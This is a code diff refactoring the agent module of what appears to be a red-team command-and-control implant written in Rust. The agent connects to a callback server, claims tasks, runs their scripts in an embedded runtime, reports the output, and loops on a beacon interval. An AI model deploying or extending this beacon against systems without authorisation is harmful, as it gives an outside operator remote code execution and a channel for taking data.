@@ -1,23 +1,30 @@
-use crate::task::TaskHandle;
-use anyhow::{Context, Result};
+use std::time::{Duration, Instant};
+
+use crate::{config::Config, task::TaskHandle};
+use anyhow::Result;
 use c2::{
-    pb::{Beacon, ClaimTasksRequest, Task},
+    pb::{Beacon, ClaimTasksRequest},
     TavernClient,
 };
-use eldritch::{
-    channel::channel,
-    pb::{File, ProcessList},
-    Runtime,
-};
-use std::{borrow::BorrowMut, sync::mpsc::Receiver};
+use eldritch::Runtime;
 
 pub struct Agent {
-    pub info: Beacon,
-    pub tavern: TavernClient,
-    pub handles: Vec<TaskHandle>,
+    info: Beacon,
+    tavern: TavernClient,
+    handles: Vec<TaskHandle>,
 }
 
 impl Agent {
+    pub async fn gen_from_config(cfg: Config) -> Result<Agent> {
+        let tavern = TavernClient::connect(cfg.callback_uri).await?;
+
+        Ok(Agent {
+            info: cfg.info,
+            tavern,
+            handles: Vec::new(),
+        })
+    }
+
     async fn claim_tasks(&mut self) -> Result<()> {
         let resp = self
             .tavern
@@ -26,6 +33,7 @@ impl Agent {
             })
             .await?;
 
+        // TODO: This
         let tasks = resp.get_ref().tasks.clone();
 
         for task in tasks {
@@ -35,32 +43,64 @@ impl Agent {
                     continue;
                 }
             };
-            let (sender, recv) = channel();
 
-            let handle = tokio::spawn(async move {
-                let runtime = Runtime::new(sender);
-                runtime.run(tome);
-            });
+            let (runtime, output) = Runtime::new();
+            let handle = tokio::spawn(async move { runtime.run(tome) });
 
-            self.handles.push(TaskHandle {
-                id: task.id,
-                recv,
-                handle,
-            });
+            self.handles.push(TaskHandle::new(task.id, output, handle));
         }
         Ok(())
     }
 
-    pub async fn report(&mut self) -> Result<()> {
-        for handle in &self.handles {
-            handle.report(self.tavern.borrow_mut()).await?;
+    async fn report(&mut self) -> Result<()> {
+        // Report output from each handle
+        let mut idx = 0;
+        while idx < self.handles.len() {
+            self.handles[idx].report(&mut self.tavern).await?;
+
+            // Drop any handles that have completed
+            if self.handles[idx].is_finished() {
+                self.handles.remove(idx);
+                continue;
+            }
+            idx += 1;
         }
+
         Ok(())
     }
 
+    /*
+     * Callback once using the configured client to claim new tasks and report available output.
+     */
     pub async fn callback(&mut self) -> Result<()> {
         self.claim_tasks().await?;
         self.report().await?;
+
         Ok(())
+    }
+
+    /*
+     * Callback indefinitely using the configured client to claim new tasks and report available output.
+     */
+    pub async fn callback_loop(&mut self) {
+        loop {
+            let start = Instant::now();
+
+            match self.callback().await {
+                Ok(_) => {}
+                Err(_err) => {
+                    #[cfg(debug_assertions)]
+                    eprint!("Error draining channel: {}", _err)
+                }
+            };
+
+            let interval = self.info.interval.clone();
+            let delay = match interval.checked_sub(start.elapsed().as_secs()) {
+                Some(secs) => Duration::from_secs(secs),
+                None => Duration::from_secs(0),
+            };
+
+            std::thread::sleep(delay);
+        }
     }
 }
